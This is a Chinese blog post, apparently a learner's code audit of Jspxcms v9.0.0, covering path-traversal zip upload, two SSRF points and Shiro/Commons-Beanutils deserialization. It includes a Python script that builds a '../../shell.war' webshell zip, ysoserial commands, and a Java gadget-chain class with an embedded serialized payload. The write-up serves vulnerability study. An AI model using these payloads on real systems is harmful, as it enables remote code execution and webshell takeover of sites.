# Jspxcms v9.0代码审计


<!--more-->

## 简介

Jspxcms是灵活的、易扩展的开源网站内容管理系统(java cms,jsp cms)，支持多组织、多站点、独立管理的网站群。



jspxcms v9.0.0的存在SQL注入、文件上传、SSRF、Shiro反序列化等漏洞



## 环境部署

源码下载路径：下载源码：https://gitee.com/jspxcms/Jspxcms/tree/v9.0.0/



更换MySQL5为MySQL8（根据自己情况，我之前用的MySQL8）：

https://www.ujcms.com/documentation/487.html



![image-20240714105756597](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714105756597.png)

访问http://localhost:8080/cmscp/，登录后台，用户名admin，密码为空：

![image-20240714105816435](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714105816435.png)







## SQL注入

根据pom.xml文件可知，这套CMS使用了`Hibernate`作为数据持久化框架：



在未正确使用Hibernate框架的情况下会产生SQL注入漏洞，可以通过全局搜素“`query`”快速寻找可能存在的漏洞点。



在Hibernate中，如果使用了占位符（问号?的形式）的方式构造SQL语句，基本可以避免SQL注入:

![image-20240714121226814](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714121226814.png)





找了一些没找到sql注入





## 文件上传

这个漏洞在文件管理的压缩包上传功能，上传的压缩包会被自动解压，如果我们在压缩包中放入 war 包并配合解压后目录穿越 war 包就会被移动到 tomcat 的 webapps 目录，而 tomcat 会自动解压 war 包。







> 注意：这里测试需要启动 tomcat 做测试，而不是 IDEA 的 SpringBoot，否则可能无法成功。

将jsp打包为war包：

```bash
java -cf shell.war .\shell.jsp
```



然后将 war 包打包成压缩文件:

```python
import zipfile

zip = zipfile.ZipFile('test.zip','w',zipfile.ZIP_DEFLATED)

with open('shell.war', 'rb') as f:
    data = f.read()

# 加入目录穿越操作，上传目录为src/main/webapp/uploads/users/1，这里因为要穿到webapp目录下，所以穿两层。
# 如果是黑盒审计的话，穿越层数只能遍历尝试了
zip.writestr('../../shell.war',data)
zip.close()

```



> 这里有个jdk版本的小坑，冰蝎jsp的webshell里用到的base64解密操作适用于jdk1.8及以前，
>
> 如果jdk是以后的，得改下jsp websell里的base64操作，不然访问会报500错误。参考https://blog.csdn.net/u010250240/article/details/89945871：





分析漏洞产生的原因，抓取文件上传的请求包：

![image-20240714124155878](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714124155878.png)





搜索`zip_upload.do`

![image-20240714124312125](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714124312125.png)



跟进zipUpload()，发现一个解压函数AntZipUtils.unzip():

![image-20240714124410242](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714124410242.png)



继续跟进：

![image-20240714124439009](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714124439009.png)





可以看到文件名name没有做任何处理就赋给File文件对象，接着执行到fos.write时shell.war就可以被写入到指定路径了，比如Tomcat的webapp目录。

![image-20240714124736766](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714124736766.png)



为什么不直接上传 jsp 文件 getshell 呢？这里借用其他师傅们分析的结论：

试一下，发现响应 404 文件不存在，并且文件路径前加了 /jsp。

![image-20240714125016524](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714125016524.png)

通过调试发现 JspDispatcherFilter.java 会对访问的 jsp 文件路径前加 /jsp，这就是不直接上传 jsp 文件 getshell的原因。而我们使用压缩包的方式会将 shell.war 解压到 tomcat 的 webapps 目录，这相当于一个新的网站项目JspDispatcherFilter.java 是管不着的。

![image-20240714125033512](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714125033512.png)





## SSRF

全局搜索关键字



### 1

搜索`openConnection`

> 优先选择controller层的类，因为可能存在前端参数可控的情况

可以看到有个controller层的类![image-20240714121804826](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714121804826.png)

在`src/main/java/com/jspxcms/core/web/back/UploadControllerAbstract.java#ueditorCatchImage()`方法下。参数`source[]`可控，当执行到`conn.getContentType().indexOf(“image”)` 时就会去请求相应的资源：

![image-20240714121844971](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714121844971.png)



ctrl+单击方法名，搜索调用ueditorCatchImage()方法的位置，可以看到访问路径为/ueditor，action参数需要等于catchimage：

![image-20240714122125077](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714122125077.png)

构造payload触发漏洞，成功触发SSRF：

![image-20240714122459582](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714122459582.png)

![image-20240714122535821](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714122535821.png)



### 2

直接IDEA搜索敏感函数，找到一处使用了`HttpClient.execute()`的方法fetchHtml()，它被当前类的另一个fetchHtml()调用：

![image-20240714122802158](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714122802158.png)

![image-20240714122900947](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714122900947.png)





ctrl+单击方法名，找到调用fetchHtml()的方法，发现有四处都在controller中：

![image-20240714122933694](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714122933694.png)

但是仅有一处可控前端参数url：

![image-20240714123500988](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714123500988.png)

验证：

![image-20240714123610911](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714123610911.png)



## Shiro反序列化

在审计第三方组件的漏洞时，首先需要翻阅pom.xml文件，该文件中记录着这个项目使用的第三方组件及其版本号。

我们可以对所使用的Jspxcms的第三方组件的版本进行版本比对，以判断该版本是否受到已知漏洞的影响。

**我们以第三方组件`shiro`为例，查看pom文件，发现使用了shiro框架，且版本为1.3.2（Shiro 并且版本小于 1.4.2）可以利用 Shiro-721**

![image-20240714111848670](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714111848670.png)





可以看到`Commons-beanutils`依赖，版本是`1.9.3`

ysoserial中的Commons-beanutils利用链不仅需要`Commons-beanutils`,同时还需要 `commons-collections` 以及 `commons-logging,`也就是说需要目标中同时存在这3个第三方库的依赖，这条利用链才有效，Jspxcms正好具备这个条件。

![image-20240714112124592](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714112124592.png)



**先测试一下是否可用：**

```bash
java -jar ysoserial-all.jar CommonsBeanutils1 "open -a Calculator" > /Users/xps/Study/MyCode/JavaCode/JavaSec/Jspxcms-v9.0.0/ser.txt

java -jar ysoserial.jar CommonsBeanutils1 "open -a Calculator" |base64
```

输出的字符串放到下面p牛的代码中：

```java
package com.jspxcms.core.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class test {
    public static void main(String[] args) throws Exception{

        byte[] code = Base64.getDecoder().decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqbK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAdeXNvc2VyaWFsL1B3bmVyODY1Mjc0ODEwOTU5NTgBAB9MeXNvc2VyaWFsL1B3bmVyODY1Mjc0ODEwOTU5NTg7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAQAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhxAH4ADXg=");

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "xxx");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add("x");
        queue.add("x");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("src\\main\\java\\com\\jspxcms\\core\\test\\ser.txt"));
        out.writeObject(queue);
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream("src\\main\\java\\com\\jspxcms\\core\\test\\ser.txt"));
        in.readObject();
        in.close();
    }

    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}

```



我一直弹不出来测试失败，还不知道怎么回事。





使用 https://github.com/inspiringz/Shiro-721 进行测试。

爆破出可以攻击的 rememberMe Cookie 大概需要一个多小时，如下界面所示(借师傅的图：https://xz.aliyun.com/t/10891)

![image-20240714114521818](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714114521818.png)



进行测试成功弹出计算器，反序列化 RCE 利用成功(借图)

![image-20240714114514860](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240714114514860.png)































---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/  

